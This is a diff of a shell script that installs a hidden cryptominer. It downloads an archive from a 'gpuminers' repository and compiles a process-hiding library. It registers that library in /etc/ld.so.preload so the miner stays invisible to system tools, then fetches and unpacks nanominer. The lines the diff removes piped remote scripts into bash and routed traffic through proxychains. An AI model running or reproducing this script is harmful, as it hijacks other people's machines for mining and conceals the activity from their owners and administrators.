@@ -1,17 +1,12 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/SetUpSSHTunnelWithAzure.sh | bash
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
-sleep .1
-proxychains curl ifconfig.me
-
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
 unzip magicNan.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-proxychains wget https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-linux-3.3.2-cuda11.tar.gz
+wget https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-linux-3.3.2-cuda11.tar.gz
 tar -xvzf nanominer-linux-3.3.2-cuda11.tar.gz
 cd nanominer-linux-3.3.2-cuda11
 rm config*
